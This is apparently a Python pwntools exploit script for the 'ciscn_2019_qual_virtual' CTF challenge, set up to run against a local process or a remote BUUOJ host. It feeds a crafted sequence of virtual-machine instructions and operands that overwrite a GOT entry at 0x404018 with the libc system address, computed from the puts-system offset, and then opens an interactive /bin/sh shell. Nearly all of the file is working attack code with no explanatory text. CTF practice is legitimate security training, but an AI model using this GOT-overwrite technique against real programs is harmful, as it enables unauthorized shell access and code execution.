#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='./ciscn_2019_qual_virtual'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process(elfelf)
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
		else :
			io=remote('node3.buuoj.cn',29816)
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]


		# def add(a,b):
		# 	io.sendlineafter('Your choice:','1')
		# 	io.sendlineafter('size?>',str(a))
		# 	io.sendafter('content:',b)

		# def edit(a,b):
		# 	io.sendlineafter('Your choice:','2')
		# 	io.sendlineafter('Index:',str(a))
		# 	io.sendafter('content:',b)

		# def show(a):
		# 	io.sendlineafter('Your choice:','3')
		# 	io.sendlineafter('Index:',str(a))

		# def delete(a):
		# 	io.sendlineafter('Your choice:','4')
		# 	io.sendlineafter('Index:',str(a))


		io.sendlineafter(':','/bin/sh\x00')

		pay='push push push load sub div push sub push push load load sub push load push add save'
		pay+=''
		io.sendlineafter(':',pay)
		# gdb.attach(io,'b *0x401CCE\nb *0x4012F4\nb *0x401AAC')
		addr=libc.sym['puts']-libc.sym['system']


		io.sendlineafter(':','8 '+str(0x404018)+' -5 0 '+str(addr)+' -1 -1 1')

		
		
		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# system_addr=libc.sym['system']

		
		# success('libc_base:'+hex(libc_base))
		# success('heap_base:'+hex(heap_base))
		
		
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue